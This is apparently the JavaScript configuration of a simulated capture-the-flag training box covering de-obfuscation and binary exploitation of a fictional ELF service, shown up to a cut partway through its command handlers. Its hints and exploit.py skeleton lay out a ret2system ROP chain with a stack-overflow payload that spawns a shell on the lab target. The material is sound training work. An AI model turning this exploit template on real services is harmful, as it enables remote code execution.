/* ============================================================
   CTF ARENA — Box C7: The Veiled Logic
   Multi-Stage Campaign | Obfuscation & De-obfuscation, Binary Exploitation
   Config: filesystem, binary analysis simulation, flags, hints, lore
   ============================================================ */

const C7Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Veiled Logic',
    subtitle: 'Multi-Stage Campaign — Obfuscation Analysis, De-obfuscation & Binary Exploitation',
    difficulty: 'Advanced',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_c7',
    registryId: 'c7-veiled-logic',
    trackerKey: 'ctf_c7',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'acquire',
            name: 'Binary Acquisition',
            icon: '\uD83D\uDCC1',
            description: 'Locate and acquire the CipherSpeak binary from the target. Confirm it is a valid ELF executable and identify the service running on TCP/1337.',
            requiredFlags: [],
            mitre: ['T1046', 'T1105'],
            unlocks: ['static'],
            locked: false
        },
        {
            id: 'static',
            name: 'Static Analysis',
            icon: '\uD83D\uDD2C',
            description: 'Load CipherSpeak into Ghidra or IDA. Identify the obfuscation techniques: control flow flattening, junk code insertion, string encryption, and anti-disassembly tricks.',
            requiredFlags: [],
            mitre: ['T1027', 'T1027.002'],
            unlocks: ['dynamic'],
            locked: true
        },
        {
            id: 'dynamic',
            name: 'Dynamic Analysis & De-obfuscation',
            icon: '\uD83D\uDC1B',
            description: 'Attach GDB to CipherSpeak. Identify the dispatcher loop and the string decryption routine. Set breakpoints to dump decrypted strings. Recover the hidden C2 domain.',
            requiredFlags: [],
            mitre: ['T1027.007', 'T1622'],
            unlocks: ['exploit'],
            locked: true
        },
        {
            id: 'exploit',
            name: 'Vulnerability Discovery & Exploitation',
            icon: '\uD83D\uDCA5',
            description: 'With the control flow flattening removed, a stack buffer overflow surfaces in the input handler. Craft a ROP chain to bypass NX and redirect execution. Extract the Shadow Covenant.',
            requiredFlags: ['user'],
            mitre: ['T1203', 'T1059.004'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Scan the target and download the binary',
                tip: 'Run nmap 10.13.37.1 to identify the open port, then use wget to download CipherSpeak.',
                trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
            },
            {
                title: 'Identify the binary and run initial analysis',
                tip: 'Use file and strings on the binary. Notice strings are encrypted — most output is garbage.',
                trigger: { event: 'command', match: { cmd: 'contains:strings' } }
            },
            {
                title: 'Load into Ghidra and identify obfuscation',
                tip: 'Use ghidra to decompile. Look for the large switch/dispatcher block — that is the control flow flattening. Note the string decryption function called repeatedly.',
                trigger: { event: 'command', match: { cmd: 'contains:ghidra' } }
            },
            {
                title: 'Attach GDB and dump decrypted strings',
                tip: 'Run gdb cipherspeak. Set a breakpoint on the decrypt function return. Run and dump rax — you will see plaintext strings appear including the C2 domain.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Find the overflow and craft the exploit',
                tip: 'After de-obfuscation the input handler at 0x4012a0 takes 64 bytes but reads 512. Build a ROP chain using gadgets from the binary. Send it to port 1337.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Obfuscated binary analysis and encrypted string recovery', skill: 'Binary De-obfuscation & String Extraction' },
            { flagId: 'root', objective: '1.3', description: 'Given a scenario, analyze indicators associated with application attacks — Buffer overflow exploitation via ROP chain', skill: 'Stack Overflow Exploitation & ROP Chaining' },
            { flagId: 'root', objective: '2.6', description: 'Compare and contrast types of vulnerabilities — Memory corruption bugs obscured by obfuscation', skill: 'Multi-Stage Binary Exploitation' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.13.37.1 (SHADOW-SRV-01 — Shadow Encoders)\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (analysis session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',        // 'attacker' | 'gdb' | 'ghidra' | 'exploit'
    _binaryAcquired: false,      // wget/download completed
    _stringsRun: false,          // strings tool used on binary
    _ghidraLoaded: false,        // ghidra analysis performed
    _antiDebugBypassed: false,   // PTRACE_TRACEME check bypassed
    _decryptBpSet: false,        // breakpoint on decrypt_string placed
    _overflowDiscovered: false,  // buffer overflow identified in decompiler
    _ropChainBuilt: false,       // rop chain sent to port 1337
    _gdbActive: false,

    _switchContext(ctx, term) {
        C7Config._context = ctx;
        // Update terminal prompt to reflect current analysis context
        if (term && term.config) {
            var prompt = C7Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C7Config._context) {
            case 'gdb': return '(gdb) ';
            default:    return null; // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 150 },
        { id: 'root', points: 350 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 },  // 45 minutes
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with nmap 10.13.37.1. Port 1337/tcp will be open (CipherSpeak service) alongside 22/tcp (SSH). Download the binary: wget http://10.13.37.1:8080/cipherspeak — then run file and strings on it.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Most strings output is garbage (encrypted). Load into Ghidra — run ghidra from terminal. The control flow flattening is obvious: one giant dispatcher switch at 0x401240. Find the function decrypt_string() called repeatedly from the dispatcher. Set a GDB breakpoint after it returns: break *0x4013f8',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'In GDB: run the binary, then at the breakpoint use x/s $rax to print the returned string. You will see plaintext strings appear one by one. The C2 domain "shadow-c2.network" and the internal key "V31l3dL0g1c" will both appear. The domain IS Flag 1 (user.txt). cat user.txt reveals it.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After de-obfuscation, run checksec on cipherspeak — NX is enabled, no PIE, partial RELRO. The overflow is in handle_input() at 0x4012a0: buf[64] but read(0, buf, 512). Use ROPgadget to find gadgets. The ROP chain needs: pop rdi; ret -> /bin/sh address -> system() PLT. Send with python3 exploit.py to port 1337.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Shadow Encoders," a secretive collective, have built their communications infrastructure around a custom utility called CipherSpeak. The binary\'s internal logic is protected by layers of obfuscation — control flow flattening, junk code, encrypted strings, and anti-debugging traps — making it appear impenetrable to casual analysis. They call this the "Veiled Logic." Your mission, Peerless: acquire CipherSpeak, strip away its protections, uncover the weakness hidden inside, and extract the Shadow Covenant — a critical encrypted message buried deep within the binary\'s obfuscated core.',
        scenario: 'The Shadow Encoders run a covert C2 infrastructure using CipherSpeak as their message relay. The binary accepts connections on TCP/1337 and processes encrypted operator commands. Their lead developer, known only as "Obscura," is confident the obfuscation is sufficient security. He is wrong. A custom XOR encryption scheme with a 4-byte key, combined with a stack buffer overflow in the input handler deliberately obscured by control flow flattening, makes this binary a textbook case of security through obscurity. Tear the veil away.',
        outro: 'The Veiled Logic has been defeated. CipherSpeak\'s obfuscation peeled back layer by layer: the encrypted C2 domain recovered from runtime memory, the buffer overflow exploited through a precisely crafted ROP chain, and the Shadow Covenant extracted from the binary\'s encrypted data segment. The Shadow Encoders\' "impenetrable" fortress was nothing but dead weight on an insecure foundation.',
        ecer: {
            executive: 'Collective leadership trusted obfuscation as a security boundary rather than an access control mechanism',
            culture: 'No code review, no threat modeling — the developer worked in isolation with no peer audit of the obfuscation scheme',
            employee: 'Hardcoded C2 domain and XOR key inside the binary; buffer overflow left unfixed because obfuscation was believed to hide it',
            regulatory: 'No security validation of the cryptographic implementation; custom crypto used instead of established libraries'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Shadow Encoders minimal web presence
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.13.37.1/',

        pages: {
            '/': {
                title: 'Shadow Encoders — Nothing to See Here',
                html: `
                    <div style="text-align:center; padding:60px 20px;">
                        <div style="font-size:3rem; margin-bottom:16px; filter:grayscale(1) opacity(0.4);">&#128683;</div>
                        <h1 style="color:#2c3e50; font-size:1.1rem; font-family:monospace; letter-spacing:0.1em;">UNAUTHORIZED ACCESS PROHIBITED</h1>
                        <div style="color:#888; font-size:0.75rem; margin-top:8px; font-family:monospace;">Apache/2.4.57 — 10.13.37.1</div>
                    </div>
                    <div style="max-width:460px; margin:0 auto; background:#1a1a2e; border:1px solid #333; border-radius:4px; padding:16px; font-family:monospace; font-size:0.75rem;">
                        <div style="color:#8e44ad; margin-bottom:6px;">## NOTICE ##</div>
                        <div style="color:#aaa;">Binary distribution: <a href="http://10.13.37.1:8080/cipherspeak" style="color:#8e44ad;">http://10.13.37.1:8080/cipherspeak</a></div>
                        <div style="color:#aaa; margin-top:4px;">Service port: 1337/tcp</div>
                        <div style="color:#aaa; margin-top:4px;">All connections are logged and audited.</div>
                    </div>
                `,
                formHandler: null
            },
            '/cipherspeak': {
                title: '404 Not Found',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">404 Not Found</h1>
                    <p style="color:#888;">Use port 8080 to download the binary: wget http://10.13.37.1:8080/cipherspeak</p>
                    <p style="color:#aaa; font-size:0.75rem;">Apache/2.4.57 (Ubuntu) Server at 10.13.37.1 Port 80</p>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE VEILED LOGIC ===\nTarget: 10.13.37.1 (SHADOW-SRV-01 — Shadow Encoders)\nObjective: Obfuscation analysis, de-obfuscation, binary exploitation\n\nAttack chain:\n1. Acquire CipherSpeak binary from http://10.13.37.1:8080/cipherspeak\n2. Static analysis — identify obfuscation: CFF, junk code, encrypted strings\n3. Dynamic analysis — GDB attach, bypass anti-debug, dump decrypted strings\n4. Recover C2 domain from runtime memory (Flag 1 — user.txt)\n5. De-obfuscate control flow — identify buffer overflow in handle_input()\n6. Craft ROP chain — exploit the overflow via TCP/1337 (Flag 2 — root.txt)\n\nTools: Ghidra, GDB+Pwndbg, ROPgadget, Python3+pwntools\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.13.37.1\nwget http://10.13.37.1:8080/cipherspeak\nfile cipherspeak\nstrings cipherspeak | head -40\nchmod +x cipherspeak\nghidra'
                                },
                                'exploit.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# CipherSpeak exploit — ROP chain skeleton\n# Fill in after ROPgadget analysis\n\nfrom pwn import *\n\nHOST = "10.13.37.1"\nPORT = 1337\n\n# TODO: populate after ROPgadget --binary cipherspeak\npop_rdi   = 0x0  # pop rdi; ret\nbinsh     = 0x0  # /bin/sh in binary\nsystem    = 0x0  # system@plt\n\npayload  = b"A" * 72          # padding to saved rip\npayload += p64(pop_rdi)\npayload += p64(binsh)\npayload += p64(system)\n\nconn = remote(HOST, PORT)\nconn.sendline(payload)\nconn.interactive()'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED BINARY ANALYSIS DATA
    // CipherSpeak internal representation for tool responses
    // ═══════════════════════════════════════════════════════

    _binary: {
        name: 'cipherspeak',
        arch: 'ELF 64-bit LSB executable, x86-64',
        size: '147456',
        sha256: 'a3f8c2e1d94b057f163a2c8e4d7f9b0c1e5a3d2f8b6c9e0d1a4f7b3c2e5d8a1',
        // Encrypted strings as they appear in the raw binary
        rawStrings: [
            'X%#@!kL9mP2',
            '\x00\x00\x00\x00\x00\x00\x00',
            'Qw7#$Yz!3&nR',
            '\xde\xad\xbe\xef\xca\xfe',
            'Kp!9Lm$Xz#2Q',
            'z9!@#$%^&*()',
            '\xff\xfe\xfd\xfc\xfb\xfa\xf9',
            'W3$#!kM9@pLz',
            '====BEGIN CIPHER====',   // leaks through — not all strings encrypted
        ],
        // Strings visible at runtime after decryption (dumped from gdb)
        decryptedStrings: [
            '[*] CipherSpeak v2.3.1 — Shadow Encoders Communication Utility',
            '[*] Initializing secure channel...',
            'shadow-c2.network',
            '/usr/lib/libcrypt.so.1',
            '[ERR] Anti-debug check triggered. Terminating.',
            'V31l3dL0g1c',
            '[*] Awaiting operator input on port 1337',
            '[*] Connection established. Relay active.',
            'SHADOW_COVENANT_DECRYPT_KEY'
        ],
        // Ghidra decompiler output (representative snippets)
        ghidra: {
            mainDispatcher: `// -------------------------------------------------------
// DECOMPILED: main_dispatcher() @ 0x401240
// WARNING: Control Flow Flattening detected
// Ghidra confidence: LOW — recommend manual review
// -------------------------------------------------------
undefined8 main_dispatcher(void)
{
  int iVar1;
  uint state;
  uint next_state;

  state = 0x4e2f1a;
  do {
    switch (state) {
      case 0x1b3c:
        /* [JUNK] */ iVar1 = (int)(state * 0x6b8b4567 >> 0x11) ^ state;
        next_state = 0x4e2f1a;
        break;
      case 0x2d7f:
        check_antidebug();
        next_state = 0x5c1e;
        break;
      case 0x3a9b:
        init_strings();       // decrypts all strings at runtime
        next_state = 0x1b3c;
        break;
      case 0x4e2f1a:
        next_state = 0x3a9b;  // entry point — always start here
        break;
      case 0x5c1e:
        bind_port(0x539);     // 0x539 = 1337
        next_state = 0x7f04;
        break;
      case 0x6b8b:
        /* [JUNK] */ iVar1 = (iVar1 ^ 0xdeadbeef) + state;
        next_state = 0x6b8b;
        break;
      case 0x7f04:
        accept_loop();
        next_state = 0x9c3d;
        break;
      case 0x9c3d:
        /* [JUNK] */ state = (uint)((ulong)(state * (ulong)state) >> 0x20);
        next_state = 0x7f04;  // loops back — junk exit condition
        break;
    }
    state = next_state;
  } while (true);
}`,
            handleInput: `// -------------------------------------------------------
// DECOMPILED: handle_input() @ 0x4012a0
// Control flow partially recovered after de-obfuscation
// -------------------------------------------------------
void handle_input(int conn_fd)
{
  char buf [64];    // <-- fixed-size stack buffer
  ssize_t n;
  uint state;

  state = 0x1f2e;
  do {
    switch (state) {
      case 0x1f2e:
        /* [JUNK] nop slide */
        state = 0x3d5c;
        break;
      case 0x3d5c:
        memset(buf, 0, 64);
        state = 0x5b7a;
        break;
      case 0x5b7a:
        // VULNERABILITY: read() accepts up to 512 bytes into 64-byte buf
        // No bounds check. Classic stack smash obscured by CFF.
        n = read(conn_fd, buf, 0x200);   // 0x200 = 512 — OVERFLOW
        state = 0x7986;
        break;
      case 0x7986:
        if (n <= 0) { state = 0xf1c3; break; }
        relay_message(buf, n);
        state = 0x9ba4;
        break;
      case 0x9ba4:
        /* [JUNK] */ asm volatile("nop\nnop\nnop\nnop\n");
        state = 0x5b7a;
        break;
      case 0xf1c3:
        close(conn_fd);
        return;
    }
  } while (true);
}`,
            decryptString: `// -------------------------------------------------------
// DECOMPILED: decrypt_string() @ 0x4013a0
// XOR cipher — 4-byte rotating key: 0x56, 0x33, 0x69, 0x6c
// ASCII: "V3il" (hint: key is related to "Veiled Logic")
// -------------------------------------------------------
char * decrypt_string(char *enc_buf, int len)
{
  int i;
  byte key [4];

  key[0] = 0x56;   // 'V'
  key[1] = 0x33;   // '3'
  key[2] = 0x69;   // 'i'
  key[3] = 0x6c;   // 'l'

  i = 0;
  while (i < len) {
    enc_buf[i] = enc_buf[i] ^ key[i & 3];
    i++;
  }
  return enc_buf;
}`,
            checkAntidebug: `// -------------------------------------------------------
// DECOMPILED: check_antidebug() @ 0x401500
// Uses ptrace(PTRACE_TRACEME) self-trace trick
// If already being traced, ptrace returns -1 and the
// process exits. Bypass: patch the conditional branch
// or set return value in GDB before the check executes.
// -------------------------------------------------------
void check_antidebug(void)
{
  long ret;

  ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
  if (ret == -1) {
    write(2, decrypted_strings[4], 0x2e);  // "[ERR] Anti-debug check triggered."
    exit(1);
  }
  return;
}`
        },
        // ROPgadget output for the binary
        ropGadgets: `ROPgadget v7.3 -- http://www.shell-storm.org/project/ROPgadget/
Gadgets found in binary:

0x0000000000401623 : add rsp, 8 ; ret
0x0000000000401618 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040161a : pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040161c : pop r14 ; pop r15 ; ret
0x000000000040161e : pop r15 ; ret
0x0000000000401617 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040161f : pop rdi ; ret
0x0000000000401615 : pop rsi ; pop r15 ; ret
0x0000000000401616 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401614 : ret

Unique gadgets found: 14`,
        // checksec output
        checksec: `[*] '/home/kali/cipherspeak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)`,
        // readelf -s output (symbol table — stripped, but PLT visible)
        plt: `Symbol table '.dynsym' contains 8 entries:
   Num: Value            Size  Type    Bind   Vis      Ndx  Name
     0: 0000000000000000     0  NOTYPE  LOCAL  DEFAULT  UND
     1: 0000000000401060     0  FUNC    GLOBAL DEFAULT  UND  read@GLIBC_2.2.5
     2: 0000000000401070     0  FUNC    GLOBAL DEFAULT  UND  write@GLIBC_2.2.5
     3: 0000000000401080     0  FUNC    GLOBAL DEFAULT  UND  bind@GLIBC_2.2.5
     4: 0000000000401090     0  FUNC    GLOBAL DEFAULT  UND  ptrace@GLIBC_2.2.5
     5: 00000000004010a0     0  FUNC    GLOBAL DEFAULT  UND  exit@GLIBC_2.2.5
     6: 00000000004010b0     0  FUNC    GLOBAL DEFAULT  UND  system@GLIBC_2.2.5
     7: 00000000004010c0     0  FUNC    GLOBAL DEFAULT  UND  close@GLIBC_2.2.5`
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.13.37.1';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target || target === '10.13.37.1') {
                if (engine) engine.advancePhase && engine.advancePhase('acquire');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.13.37.1
Host is up (0.031s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
1337/tcp open  waste?
8080/tcp open  http-alt  Python/3.10 SimpleHTTP

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 15.47 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'wget': function(args, term, engine) {
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'wget: missing URL\nUsage: wget [OPTION]... [URL]...';

            if (url.includes('10.13.37.1:8080') && url.includes('cipherspeak')) {
                C7Config._binaryAcquired = true;
                if (engine) engine.advancePhase && engine.advancePhase('static');
                return `--2026-03-20 09:14:22--  http://10.13.37.1:8080/cipherspeak
Connecting to 10.13.37.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 147456 (144K) [application/octet-stream]
Saving to: 'cipherspeak'

cipherspeak         100%[===================>] 144.00K   512KB/s   in 0.3s

2026-03-20 09:14:22 (512 KB/s) - 'cipherspeak' saved [147456/147456]

[+] Binary acquired. Run: file cipherspeak && strings cipherspeak | head -40`;
            }

            return `wget: unable to resolve host address '${url.replace(/https?:\/\//, '').split('/')[0]}'`;
        },

        'curl': function(args) {
            const url = args.find(a => /^https?:\/\//.test(a)) || args.filter(a => !a.startsWith('-')).pop() || '';
            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('10.13.37.1:8080') && url.includes('cipherspeak')) {
                C7Config._binaryAcquired = true;
                return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                             Dload  Upload   Total   Spent    Left  Speed
100  144k  100  144k    0     0   288k      0 --:--:-- --:--:-- --:--:--  288k

[+] Use -o cipherspeak to save the binary. curl -o cipherspeak http://10.13.37.1:8080/cipherspeak`;
            }

            if (url.includes('10.13.37.1') && !url.includes('8080')) {
                return `<!DOCTYPE html>
<html>
<head><title>Shadow Encoders — Nothing to See Here</title></head>
<body>
<p>UNAUTHORIZED ACCESS PROHIBITED</p>
<p>Binary: http://10.13.37.1:8080/cipherspeak</p>
<p>Service: 1337/tcp</p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        'file': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: file <filename>';

            if (target.includes('cipherspeak') || target === './cipherspeak') {
                if (!C7Config._binaryAcquired) return `file: ${target}: No such file or directory`;
                return `cipherspeak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3a2f1c9e8d7b4a6f5c2e1d9b8a7f6e5d4c3b2a1f, for GNU/Linux 3.2.0, stripped`;
            }

            return `file: ${target}: No such file or directory`;
        },

        'strings': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: strings <file>';
            if (!C7Config._binaryAcquired) return `strings: ${target}: No such file or directory`;

            C7Config._stringsRun = true;
            if (engine) engine && engine.advancePhase && engine.advancePhase('static');

            return `/lib64/ld-linux-x86-64.so.2
libcrypt.so.1
${C7Config._binary.rawStrings[0]}
${C7Config._binary.rawStrings[2]}
${C7Config._binary.rawStrings[4]}
${C7Config._binary.rawStrings[6]}
${C7Config._binary.rawStrings[8]}
GLIBC_2.2.5
GLIBC_2.14
____PKTX_V
${C7Config._binary.rawStrings[1]}
${C7Config._binary.rawStrings[3]}
${C7Config._binary.rawStrings[5]}
${C7Config._binary.rawStrings[7]}
====BEGIN CIPHER====
[*] CipherSpeak v

[WARNING] Most strings are encrypted. Raw output is largely garbage.
[NOTE] Identify the string decryption routine and set a GDB breakpoint to dump plaintext.`;
        },

        'xxd': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: xxd <file>';
            if (!C7Config._binaryAcquired) return `xxd: ${target}: No such file or directory`;

            return `00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 4010 4000 0000 0000  ..>.....@.@.....
00000020: 4000 0000 0000 0000 1824 0200 0000 0000  @........$......
00000030: 0000 0000 4000 3800 0900 4000 1c00 1b00  ....@.8...@.....
[... truncated — 147456 bytes total ...]
[NOTE] Use Ghidra or IDA for proper disassembly. xxd only shows raw bytes.`;
        },

        'hexedit': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: hexedit <file>';
            if (!C7Config._binaryAcquired) return `hexedit: ${target}: No such file or directory`;
            return '[hexedit] Interactive hex editor — use Ghidra for structured analysis of this binary.';
        },

        'chmod': function(args) {
            if (args.length < 2) return 'Usage: chmod <permissions> <file>';
            return '';  // silent success
        },

        'checksec': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!C7Config._binaryAcquired) return `checksec: ${target || 'file'}: No such file or directory`;
            return C7Config._binary.checksec;
        },

        'readelf': function(args) {
            if (!C7Config._binaryAcquired) return 'readelf: cipherspeak: No such file or directory';
            const hasS = args.includes('-s') || args.includes('--syms');
            if (hasS) return C7Config._binary.plt;
            return `ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401240
  Start of program headers:          64 (bytes into file)
  Start of section headers:          145680 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)

[NOTE] Binary is stripped — use readelf -s for dynamic symbols, or Ghidra for full analysis.`;
        },

        'objdump': function(args) {
            if (!C7Config._binaryAcquired) return 'objdump: cipherspeak: No such file or directory';
            return `cipherspeak:     file format elf64-x86-64

Disassembly of section .text:

0000000000401240 <.text>:
  401240: 55                    push   %rbp
  401241: 48 89 e5              mov    %rsp,%rbp
  401244: 48 83 ec 10           sub    $0x10,%rsp
  401248: c7 45 fc 1a 2f 4e 00  movl   $0x4e2f1a,-0x4(%rbp)
  40124f: eb 00                 jmp    401251
  401251: 8b 45 fc              mov    -0x4(%rbp),%eax
  401254: 89 c0                 mov    %eax,%eax
  401256: e9 00 00 00 00        jmpq   *0x... [indirect — anti-disassembly]

[NOTE] Control flow flattening makes static disassembly unreliable.
Load in Ghidra for decompilation and CFG reconstruction.`;
        },

        'ghidra': function(args, term, engine) {
            if (!C7Config._binaryAcquired) return 'ghidra: cipherspeak not found. Download it first with wget.';

            C7Config._ghidraLoaded = true;
            if (engine) engine.advancePhase && engine.advancePhase('dynamic');

            return `Ghidra 10.4 — NSA Research Directorate
[*] Loading cipherspeak...
[*] Running auto-analysis... (this may take a moment)
[*] Analysis complete.

FINDINGS:
=========
[!] Control Flow Flattening detected at 0x401240
    Dispatcher loop with state variable — 9 switch cases identified.
    True control flow is hidden behind the state machine.

[!] Anti-disassembly: Indirect jumps via computed register values.
    Linear sweep disassembly will produce incorrect results.

[!] Function identified: decrypt_string() @ 0x4013a0
    Called 9 times from the dispatcher. Likely XOR-based.

[!] Function identified: check_antidebug() @ 0x401500
    Calls ptrace(PTRACE_TRACEME). Self-trace anti-debug trick.
    Will terminate if a debugger is already attached.

[!] Function identified: handle_input() @ 0x4012a0
    Buffer size: 64 bytes. read() call: 512 bytes. STACK OVERFLOW.

KEY DECOMPILED FUNCTIONS:
   ghidra -show main_dispatcher   (main dispatcher with CFF)
   ghidra -show handle_input      (vulnerable input handler)
   ghidra -show decrypt_string    (XOR decryption routine)
   ghidra -show check_antidebug   (PTRACE_TRACEME anti-debug)

[*] Tip: Attach GDB to dump decrypted strings at runtime.`;
        },

        'ROPgadget': function(args) {
            if (!C7Config._binaryAcquired) return 'ROPgadget: cipherspeak not found.';
            const hasBinary = args.includes('--binary') || args.join(' ').includes('cipherspeak');
            if (!hasBinary) return 'Usage: ROPgadget --binary cipherspeak';
